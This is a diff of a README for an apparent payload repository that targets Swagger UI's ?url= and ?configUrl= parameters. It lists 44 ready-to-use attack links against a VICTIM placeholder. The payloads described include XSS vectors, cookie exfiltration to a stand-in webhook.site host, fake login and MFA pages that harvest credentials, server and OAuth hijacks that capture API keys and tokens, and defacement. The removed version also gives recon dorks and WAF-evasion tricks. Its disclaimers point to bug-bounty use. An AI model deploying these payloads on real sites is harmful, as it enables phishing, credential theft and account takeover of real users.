@@ -1,298 +1,199 @@
-<div align="center">
+# Swagger UI Payload Collection
 
-```
-  ███████╗██╗    ██╗ █████╗  ██████╗ ██████╗ ███████╗██████╗
-  ██╔════╝██║    ██║██╔══██╗██╔════╝ ██╔══██╗██╔════╝██╔══██╗
-  ███████╗██║ █╗ ██║███████║██║     ██████╔╝█████╗  ██████╔╝
-  ╚════██║██║███╗██║██╔══██║██║     ██╔══██╗██╔══╝  ██╔══██╗
-  ███████║╚███╔███╔╝██║  ██║╚██████╗██║  ██║███████╗██║  ██║
-  ╚══════╝╚███╔███╔╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
-                ██████╗  █████╗ ██╗   ██╗██╗      ██████╗ ██████╗
-                ██╔══██╗██╔══██╗╚██╗ ██╔╝██║      ██╔══██╗██╔══██╗
-                ██████╔╝███████║ ╚████╔╝ ██║      ██║  ██║██████╔╝
-                ██╔══██╗██╔══██║  ╚██╔╝  ██║      ██║  ██║██╔═══╝
-                ██║  ██║██║  ██║   ██║   ███████╗██████╔╝██║
-                ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═════╝ ╚═╝
-```
+A collection of 44 attack payloads for Swagger UI pages that accept the `?url=` or `?configUrl=` parameter. Each payload is an OpenAPI (YAML) spec that Swagger UI loads and renders — the `info.description` field is rendered as HTML inside the victim's page.
 
-# ⚡ SWAGGER UI PAYLOAD ARSENAL ⚡
-
-### `?url=` / `?configUrl=` Injection Collection — 44 Payloads
-
-![version](https://img.shields.io/badge/version-1.0-00ff88?style=for-the-badge&logo=hackthebox&logoColor=white)
-![payloads](https://img.shields.io/badge/payloads-44-ff2b2b?style=for-the-badge&logo=c&logoColor=white)
-![categories](https://img.shields.io/badge/categories-9-00b3ff?style=for-the-badge&logo=archlinux&logoColor=white)
-![language](https://img.shields.io/badge/lang-YAML-black?style=for-the-badge&logo=yaml&logoColor=white)
-
-</div>
+> **Authorized security testing only.** Use only on targets you have permission to test (bug bounty in-scope, VDP, pentest engagement). Report findings through responsible disclosure.
 
 ---
 
-> **[!]** Swagger UI `?url=` aur `?configUrl=` parameters pe attacker-controlled spec load hone ka exploit —
-> HTML injection se lekar credential harvesting, cookie capture, OAuth interception, aur **API-key exfiltration** tak.
+## How to use
+
+Replace `VICTIM/swagger-ui.html` with your target's Swagger UI path. Every payload below has a ready-to-use attack link.
+
+```http
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/PAYLOAD.json
+```
+
+If the target URL already contains a `?` parameter, append with `&configUrl=` instead of `?configUrl=`.
+
+**Before use:** replace `https://webhook.site/REPLACE-ME` inside the files with your own webhook URL (webhook.site / requestbin) to capture submitted credentials, cookies and beacon hits.
 
 ---
 
-## ⚠️ // DISCLAIMER //
+## 1. XSS Vectors (`xss-*.json`)
 
-```
-╔═══════════════════════════════════════════════════════════════════╗
-║                                                                   ║
-║   ██ FOR AUTHORIZED SECURITY TESTING ONLY ██                      ║
-║                                                                   ║
-║   ✓ pentest engagements with written scope                        ║
-║   ✓ bug bounty in-scope targets                                   ║
-║   ✓ VDP / responsible disclosure programs                         ║
-║                                                                   ║
-║   ✗ unauthorized targets = CRIME                                  ║
-║     (IT Act 2000 §43/66 / CFAA / Computer Misuse Act / GDPR)      ║
-║                                                                   ║
-║   [+] mila hua bug RESPONSIBLE DISCLOSURE se report karo          ║
-║       — CERT-In (gov.in), vendor security@, bounty platform       ║
-║                                                                   ║
-╚═══════════════════════════════════════════════════════════════════╝
-```
+These payloads attempt JavaScript execution through different HTML vectors. Modern Swagger UI versions sanitize most of these (DOMPurify) — they are useful for fingerprinting and for older/unpatched versions.
 
----
+| Payload | What it does |
+|---|---|
+| `xss-img-onerror` | XSS via `<img onerror>` — fires `alert(document.cookie)` on load if event handlers are not stripped |
+| `xss-svg-animate` | XSS via SVG `<animate onbegin>` and `<set>` elements |
+| `xss-svg-xlink` | XSS via SVG link `xlink:href="javascript:..."` — triggered on click |
+| `xss-mutation-noscript` | Mutation XSS through `<noscript>` namespace confusion |
+| `xss-mutation-mathml` | Mutation XSS through MathML `<mglyph>` (known DOMPurify bypass class) |
+| `xss-mutation-style` | Mutation XSS through `<style>` element parsing |
+| `xss-details-ontoggle` | Auto-firing XSS via `<details ontoggle>` — no user interaction needed |
+| `xss-autofocus` | Auto-firing XSS via `autofocus + onfocus` — no click needed |
+| `xss-marquee-media` | XSS via `<marquee onstart>` and video/audio error handlers |
+| `xss-body-embed` | XSS via `<body onload>`, base64 `<embed>`, `<object>`, `<keygen>` |
+| `xss-formaction` | XSS via `button formaction="javascript:..."` — triggered on submit |
+| `xss-dompurify-probe` | Combined fingerprint probe — shows which vectors survive sanitization |
 
-## 📑 // INDEX //
-
-| # | Section | |
-|---|---------|---|
-| 01 | [Attack Formats](#-attack-formats-) | 3 ready URL patterns |
-| 02 | [Payload Index](#-payload-index-) | all 44, category-wise |
-| 03 | [Setup](#-setup-) | one-time replace |
-| 04 | [Testing Workflow](#-testing-workflow-) | recon → confirm → report |
-| 05 | [Verified Triggers](#-verified-triggers-) | real-world results |
-| 06 | [Troubleshooting](#-troubleshooting-) | WAF/CSP bypass |
-| 07 | [Legal](#-legal-) | law references |
-
----
-
-## 🎯 // ATTACK FORMATS //
-
-### ▸ FORMAT 1 — Direct spec (`?url=`)
-
-```
-https://VICTIM.COM/swagger-ui.html?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/main/login-basic.yaml
+```http
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/xss-img-onerror.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/xss-svg-animate.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/xss-svg-xlink.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/xss-mutation-noscript.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/xss-mutation-mathml.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/xss-mutation-style.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/xss-details-ontoggle.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/xss-autofocus.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/xss-marquee-media.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/xss-body-embed.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/xss-formaction.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/xss-dompurify-probe.json
 ```
 
-### ▸ FORMAT 2 — Config pointer (`?configUrl=`)
+## 2. Cookie Capture (`cookie-*.json`)
 
-```
-https://VICTIM.COM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/main/config.json
-```
+Attempts to steal cookies through the Authorize button flow or through XSS vectors. The `authorizationUrl: javascript:` trick works on older Swagger UI versions.
 
-### ▸ FORMAT 3 — URL already has `?` (append with `&`)
+| Payload | What it does |
+|---|---|
+| `cookie-authurl-domain` | The Authorize button executes `alert(document.domain)` — confirms JS execution path |
+| `cookie-authurl-exfil` | Authorize button sends `document.cookie` to your webhook |
+| `cookie-oauth-lure` | Fake OAuth scopes UI lures the user into Authorize, cookies sent to webhook |
+| `cookie-img-onerror` | Image error handler sends `document.cookie` to webhook via `fetch` |
+| `cookie-mutation-exfil` | MathML mutation XSS combined with cookie exfiltration |
 
-```
-https://VICTIM.COM/swagger-ui/index.html?configUrl=/api-docs/swagger-config&configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/main/xss-img-onerror.yaml
-```
-
-### ▸ FORMAT 4 — URL-encoded (WAF evasion)
-
-```
-https://VICTIM.COM/swagger-ui.html?configUrl=https%3A%2F%2Fraw.githubusercontent.com%2FRekhanshRajput%2FSwagger-xss-payloads%2Fmain%2Flogin-basic.yaml
-```
-
-> **💡 Swagger UI paths to hunt:** `swagger-ui.html` · `swagger-ui/index.html` · `swagger/index.html` · `swagger/index.html` · `api-docs/ui` · `webjars/swagger-ui/index.html` · `v3/api-docs/swagger-ui/index.html`
-
----
-
-## 🗂️ // PAYLOAD INDEX //
-
-### 💀 XSS VECTORS — `xss-*.yaml`
-
-```bash
-# har payload ka URL pattern:
-?url=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/main/<PAYLOAD>.yaml
+```http
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/cookie-authurl-domain.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/cookie-authurl-exfil.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/cookie-oauth-lure.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/cookie-img-onerror.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/cookie-mutation-exfil.json
 ```
 
-| # | Payload | Vector | Auto-fire? |
-|---|---------|--------|------------|
-| 01 | `xss-img-onerror.yaml` | `<img onerror=alert>` + `document.cookie` | ✅ load par |
-| 02 | `xss-svg-animate.yaml` | `<svg><animate onbegin>` | ✅ |
-| 03 | `xss-svg-xlink` | `<svg><a xlink:href=javascript:>` | click |
-| 04 | `xss-mutation-noscript` | mXSS `<noscript>` | ✅ |
-| 05 | `xss-mutation-mathml` | mXSS `<math><mglyph>` | ✅ |
-| 06 | `xss-mutation-style` | mXSS `<style>` namespace | ✅ |
-| 07 | `xss-details-ontoggle` | `<details ontoggle>` auto-fire | ✅ |
-| 08 | `xss-autofocus` | `autofocus+onfocus` (no-click) | ✅ |
-| 09 | `xss-marquee-media` | `<marquee onstart>` / video/audio | ✅ |
-| 10 | `xss-body-embed` | `<body onload>` / base64 embed / keygen | ✅ |
-| 11 | `xss-formaction` | `formaction=javascript:` | click |
-| 12 | `xss-dompurify-probe` | 6-vector fingerprint — konsa pass hua pata chalega | ✅ |
+## 3. Phishing Login Pages (`login-*.json`)
 
-### 🍪 COOKIE CAPTURE — `cookie-*.yaml`
+Fake login forms rendered inside the real Swagger UI page. The form `action` points to your webhook — submitted credentials arrive there. These work on modern Swagger UI because DOMPurify allows `<form>`, `<input>` and `<button>`.
 
-| # | Payload | Vector | Chalega |
-|---|---------|--------|---------|
-| 13 | `cookie-authurl-domain.yaml` | Authorize btn → `javascript:alert(document.domain)` | legacy UIs |
-| 14 | `cookie-authurl-exfil.yaml` | Authorize → cookies webhook pe | legacy UIs |
-| 15 | `cookie-oauth-lure.yaml` | OAuth scopes lure + exfil | legacy UIs |
-| 16 | `cookie-img-onerror.yaml` | `onerror=fetch(webhook+document.cookie)` | legacy UIs |
-| 17 | `cookie-mutation-exfil.yaml` | mXSS + cookie exfil combo | varies |
+| Payload | What it looks like | What it captures |
+|---|---|---|
+| `login-basic` | "Login to Swagger" error page with login form | username + password |
+| `login-sso-corporate` | Corporate SSO re-authentication screen | email + password |
+| `login-mfa-otp` | Two-factor verification screen | 6-digit OTP code |
+| `login-password-reset` | "Password expired" reset screen | old + new password |
+| `login-api-key` | "API key expired" screen | API key + email |
+| `login-aws-console` | AWS console sign-in look-alike | IAM credentials |
+| `login-vpn-portal` | VPN gateway login | user + pass + OTP |
+| `login-db-admin` | phpMyAdmin login | database credentials |
+| `login-windows-popup` | Windows Security dialog look-alike | domain credentials |
 
-### 🎣 PHISHING LOGIN PAGES — `login-*.yaml` (modern UI pe bhi chalega ✅)
-
-| # | Payload | Theme | Captures |
-|---|---------|-------|----------|
-| 18 | `login-basic.yaml` | "Login to Swagger" | user + pass |
-| 19 | `login-sso-corporate.yaml` | Corporate SSO re-auth | email + pass |
-| 20 | `login-mfa-otp.yaml` | 2FA verification | 6-digit OTP |
-| 21 | `login-password-reset.yaml` | Password expired | old + new pass |
-| 22 | `login-api-key.yaml` | API key expired | api_key + email |
-| 23 | `login-aws-console.yaml` | AWS console | IAM creds |
-| 24 | `login-vpn-portal.yaml` | VPN gateway | user + pass + OTP |
-| 25 | `login-db-admin.yaml` | phpMyAdmin | DB creds |
-| 26 | `login-windows-popup.yaml` | Windows Security dialog | domain creds |
-
-### 📡 IMAGE BEACONS / DELIVERY CONFIRM — `img-*.yaml`
-
-| # | Payload | Vector |
-|---|---------|--------|
-| 27 | `img-beacon.yaml` | 1px pixel + markdown beacon |
-| 28 | `img-capture-multi.yaml` | multi-beacon (open/render/markers) |
-| 29 | `img-overlay.yaml` | fullscreen image takeover |
-| 30 | `img-favicon-beacon.yaml` | favicon + hidden img |
-
-### 🕳️ SERVER HIJACK — `server-*.yaml` 💎 (HIGHEST IMPACT — sanitization bypass)
-
-| # | Payload | Vector |
-|---|---------|--------|
-| 31 | `server-hijack-single.yaml` | "Try it out" → requests + **API keys** attacker server pe |
-| 32 | `server-hijack-multi.yaml` | attacker server "recommended" dikhega |
-| 33 | `server-hijack-path.yaml` | subdomain-proxy style |
-
-### 🔐 OAUTH INTERCEPT — `oauth-*.yaml`
-
-| # | Payload | Vector |
-|---|---------|--------|
-| 34 | `oauth-redirect-capture.yaml` | authorizationUrl → attacker (implicit flow) |
-| 35 | `oauth-password-flow.yaml` | tokenUrl → attacker (password flow) |
-
-### ↪️ REDIRECTS — `redirect-*.yaml`
-
-| # | Payload | Vector |
-|---|---------|--------|
-| 36 | `redirect-meta.yaml` | meta refresh + JS fallback |
-| 37 | `redirect-click.yaml` | big green button |
-| 38 | `redirect-window-open.yaml` | `window.open` / `top.location` |
-
-### 🎭 HTML INJECTION — `html-*.yaml`
-
-| # | Payload | Vector |
-|---|---------|--------|
-| 39 | `html-banner.yaml` | fake maintenance notice |
-| 40 | `html-deface-overlay.yaml` | fullscreen takeover |
-| 41 | `html-fake-error.yaml` | fake fatal error |
-| 42 | `html-marquee.yaml` | scrolling banner |
-| 43 | `html-table-spoof.yaml` | fake "credentials dump" table |
-| 44 | `html-iframe-probe.yaml` | iframe/embed/object probes |
-
-### ⚙️ CONFIG POINTERS (`?configUrl=` ke liye)
-
-| File | Loads |
-|------|-------|
-| `config.json` | `login-basic` |
-| `config-xss.json` | `xss-dompurify-probe` |
-| `config-cookie.json` | `cookie-authurl-exfil` |
-
----
-
-## 🔧 // SETUP //
-
+```http
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-basic.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-sso-corporate.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-mfa-otp.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-password-reset.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-api-key.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-aws-console.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-vpn-portal.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-db-admin.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/login-windows-popup.json
 ```
-[1] sab payloads me REPLACE karo:
-    RekhanshRajput  →  tumhara GitHub username
-    Swagger-xss-payloads             →  repo ka naam
-    https://webhook.site/REPLACE-ME  →  apna webhook URL
 
-[2] webhook.site / requestbin pe listener banao
-    → login forms   = POST (creds)
-    → beacons       = GET ?event=visit
-    → cookies       = GET ?cookie=...
-    → oauth         = authorization params
+## 4. Beacons / Delivery Confirmation (`img-*.json`)
 
-[3] raw.githubusercontent block ho? → GitHub Pages on karo
-    ya VPS pe same structure host karo
+Silent tracking payloads — they load invisible images from your webhook so you can confirm the payload was delivered and the page was opened. Use these first when testing blind targets.
+
+| Payload | What it does |
+|---|---|
+| `img-beacon` | 1x1 pixel + markdown image beacon — confirms page load |
+| `img-capture-multi` | Multiple beacons with markers — confirms render |
+| `img-overlay` | Fullscreen image takeover — visible injection proof |
+| `img-favicon-beacon` | Favicon + hidden image beacons |
+
+```http
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/img-beacon.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/img-capture-multi.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/img-overlay.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/img-favicon-beacon.json
+```
+
+## 5. Server Hijack (`server-*.json`) — highest impact
+
+Replaces the API server URL in the spec. When the user clicks **Try it out** and sends a request, the request (including API keys and auth headers) goes to your server. This works even when all XSS vectors are sanitized — the `servers` field is not sanitized.
+
+| Payload | What it does |
+|---|---|
+| `server-hijack-single` | Only your server is listed — all Try-it-out requests go to your webhook |
+| `server-hijack-multi` | Your server shown as "recommended", real one as "Legacy" |
+| `server-hijack-path` | Subdomain-proxy style URL — visually looks legitimate |
+
+```http
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/server-hijack-single.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/server-hijack-multi.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/server-hijack-path.json
+```
+
+## 6. OAuth Interception (`oauth-*.json`)
+
+Sets the OAuth authorization/token endpoints to your webhook. When the user clicks **Authorize**, the authorization request or token goes to you.
+
+| Payload | What it does |
+|---|---|
+| `oauth-redirect-capture` | Implicit flow — authorization request hits your webhook |
+| `oauth-password-flow` | Password flow — token request hits your webhook |
+
+```http
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/oauth-redirect-capture.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/oauth-password-flow.json
+```
+
+## 7. Redirects (`redirect-*.json`)
+
+| Payload | What it does |
+|---|---|
+| `redirect-meta` | Meta refresh + JS fallback — auto redirect on load |
+| `redirect-click` | Big "Continue to Dashboard" button — redirect on click |
+| `redirect-window-open` | `window.open` / `top.location` link vectors |
+
+```http
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/redirect-meta.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/redirect-click.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/redirect-window-open.json
+```
+
+## 8. HTML Injection / Defacement (`html-*.json`)
+
+Visible content injection — proves the page content is attacker-controlled. Works on modern Swagger UI.
+
+| Payload | What it does |
+|---|---|
+| `html-banner` | Fake "API deprecated" maintenance banner |
+| `html-deface-overlay` | Fullscreen takeover text |
+| `html-fake-error` | Fake fatal error message |
+| `html-marquee` | Scrolling defacement banner |
+| `html-table-spoof` | Fake "exported credentials" table — content spoof |
+| `html-iframe-probe` | Tests if iframe/embed/object survive sanitization |
+
+```http
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/html-banner.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/html-deface-overlay.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/html-fake-error.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/html-marquee.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/html-table-spoof.json
+https://VICTIM/swagger-ui.html?configUrl=https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/html-iframe-probe.json
 ```
 
 ---
 
-## 🧪 // TESTING WORKFLOW //
+## Notes
 
-```
-  ┌─────────────────────────────────────────────────────────┐
-  │ STEP 1: swagger-ui.html dhundo                          │
-  │   → dir bruteforce / URLScan.io / google dorks          │
-  │   → dork: inurl:swagger-ui.html site:target.com         │
-  ├─────────────────────────────────────────────────────────┤
-  │ STEP 2: delivery confirm (img-beacon laga pehle)        │
-  │   → webhook pe GET hit aaya? = PAGE DELIVERED ✓         │
-  ├─────────────────────────────────────────────────────────┤
-  │ STEP 3: fingerprint (xss-dompurify-probe)               │
-  │   → konsa vector pass hua? DOM inspect karo             │
-  ├─────────────────────────────────────────────────────────┤
-  │ STEP 4: payload fire                                    │
-  │   → phishing form? server-hijack? cookie?               │
-  ├─────────────────────────────────────────────────────────┤
-  │ STEP 5: screenshot + evidence + REPORT                  │
-  │   → responsible disclosure ONLY                         │
-  └─────────────────────────────────────────────────────────┘
-```
+- **Replace the webhook**: `https://webhook.site/REPLACE-ME` appears in payloads that capture data. Replace it with your own webhook URL, otherwise nothing will be captured.
+- **Legacy vs modern**: `login-*`, `img-*`, `server-*`, `html-*` payloads work on current Swagger UI versions. `xss-*` and `cookie-*` payloads mostly fire only on older/unpatched versions.
+- **Direct spec format**: you can also use `?url=` with the `.yaml` file instead of `?configUrl=` with the `.json` file — both are provided in this repo.
 
----
+## Legal
 
-## 🏆 // VERIFIED TRIGGERS //
-
-```
-✔ login-*       → MULTIPLE live targets pe full phishing form render hua
-                  (DOMPurify forms allow karta hai — form/action/input sab pass)
-✔ img-inject    → real <img> element render — HTML injection confirmed
-✔ server-hijack → "Try it out" requests attacker endpoint pe gayi (API keys included!)
-✔ beacons       → webhook delivery confirm (silent)
-✖ xss-*         → modern Swagger UI (DOMPurify) pe sanitized
-                  → legacy/unpatched versions pe hi fire hoga
-```
-
----
-
-## 🔥 // TROUBLESHOOTING //
-
-| Problem | Fix |
-|---------|-----|
-| `raw.githubusercontent` CSP-blocked | GitHub Pages enable karo → `https://USER.github.io/REPO/` |
-| WAF `configUrl` param block karta hai | URL-encode (`%3A%2F%2F`) / double-encode / param pollution (`&configUrl=` dup) |
-| `?url=` par 401/403 | target spec load permission check — `configUrl` try karo |
-| XSS fire nahi hua | normal hai — modern UI sanitized hai; legacy version dhundo ya server-hijack use karo |
-| Mixed content (https page + http config) | dono https pe rakho |
-
----
-
-## ⚖️ // LEGAL //
-
-```
-- Information Technology Act, 2000 (India) — §43, §66, §66C, §66D
-- Computer Fraud and Abuse Act (US) — 18 U.S.C. §1030
-- Computer Misuse Act (UK) / GDPR Art. 32
-
-Unauthorized access/access-attempt = criminal offence.
-Ye repo sirf AUTHORIZED testing ke liye hai. Misuse tumhari zimmedari.
-```
-
----
-
-<div align="center">
-
-```
-    ╔══════════════════════════════════════════╗
-        stay low   //   move fast   //   disclose
-    ╚══════════════════════════════════════════╝
-```
-
-**⭐ Repo useful laga? Star de dena.**
-
-*Built with 🖤 for the community — 2026*
-
-</div>
+This repository is for authorized security assessments only. Unauthorized testing of systems you do not own or have permission to test is illegal under the Information Technology Act 2000 (India), the Computer Fraud and Abuse Act (US), and similar laws worldwide. Always report findings through responsible disclosure.
